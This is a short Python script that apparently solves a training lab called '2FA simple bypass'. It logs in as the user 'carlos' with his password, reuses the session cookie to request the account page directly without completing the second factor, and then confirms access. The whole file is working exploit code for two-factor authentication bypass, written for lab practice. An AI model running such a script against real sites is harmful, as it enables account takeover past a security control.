import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "2FA simple bypass"

def run(url, payload, proxies=None):
    url = url.rstrip('/')
    print(Fore.WHITE + "[1] Logging in as carlos..")

    data = {"username": "carlos", "password": "montoya"}
    try:
        login_as_carlos = requests.post(
            f"{url}/login", data, allow_redirects=False, verify=False, proxies=proxies)
    except:
        print(
            Fore.RED + "\n[!] Failed to post data to /login through exception")
        exit(1)

    print(Fore.WHITE + "logged in as" + Fore.GREEN + " carlos")
    print(Fore.WHITE +
          "[2] Fetching the profile page directly bypassing 2FA..")

    try:
        session = login_as_carlos.cookies.get("session")
        cookies = {"session": session}
        carlos_profile = requests.get(
            f"{url}/my-account?id=carlos", cookies=cookies, verify=False, proxies=proxies)

        print(
            Fore.WHITE + "[3] Extracting the name 'carlos' to make sure you logged in as him.. ")

        pattern = re.findall("Your username is: carlos", carlos_profile.text)

        if len(pattern) != 0:
            print(Fore.GREEN + "Logged in successfully as carlos")
        else:
            print(Fore.RED + "⦗!⦘ Failed to login as carlos")

        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
